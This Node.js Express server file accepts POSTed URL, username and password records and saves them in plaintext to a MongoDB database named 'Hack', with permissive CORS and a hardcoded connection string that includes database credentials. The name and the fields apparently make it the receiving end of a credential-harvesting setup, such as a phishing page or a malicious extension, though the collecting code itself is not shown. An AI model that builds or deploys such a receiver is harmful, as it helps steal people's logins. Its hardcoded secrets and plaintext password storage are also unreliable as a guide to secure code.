const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const cors = require('cors');

const app = express()
app.use(cors())
app.use(express.json())

const UserDetailSchema = new mongoose.Schema({
    URL:String,
    USERNAME: String,
    PASSWORD: String
})

const UserDetail = mongoose.model('Detail', UserDetailSchema)
mongoose.connect("mongodb+srv://sanjay:sanjay@cluster0.84kv7m8.mongodb.net/Hack?retryWrites=true&w=majority", {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log("connected to database")
}).catch((err) => {
    // console.error(err)
})

const connection = mongoose.connection;
connection.once('open', () => console.log("MongoDB Connected..."))

app.post('/newdetail', async (req, res) => {
    try {
        const { USERNAME, URL, PASSWORD } = req.body
        const newUserDetail = new UserDetail({
            URL: URL,
            USERNAME: USERNAME,
            PASSWORD: PASSWORD,
        });

        await newUserDetail.save()
        res.status(201).json({
            "status": "success"
        });
    } catch (e) {
        res.json({
            "error": e
        })
        console.log(e);
    }
})

const port = 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
    console.log(`http://localhost:${port}`);
});